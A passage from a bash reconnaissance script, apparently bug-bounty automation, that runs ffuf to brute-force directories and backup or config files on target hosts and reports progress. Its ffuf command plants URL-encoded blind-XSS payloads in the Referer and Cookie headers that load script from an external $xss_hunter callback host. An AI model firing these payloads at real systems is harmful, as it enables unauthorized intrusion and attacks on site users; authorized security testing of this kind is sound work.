			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/recon/$1/dirsearch/$filename.html
		else
			echo "$i >> $stat_code"
		fi
	done
	message "Dir%20and%20files%20Scan%20Done%20for%20$1"
	echo "[+] Done ffuf for file and directory scanning"
else
	message "[-]%20Skipping%20ffuf%20for%20dir%20and%20files%20scanning"
	echo "[!] Skipping ..."
fi
sleep 5

[ ! -f ~/$1.out ] && mv ~/$1.out ~/recon/$1/ 
message "Scanner%20Done%20for%20$1"
date
echo "[+] Done scanner :)"
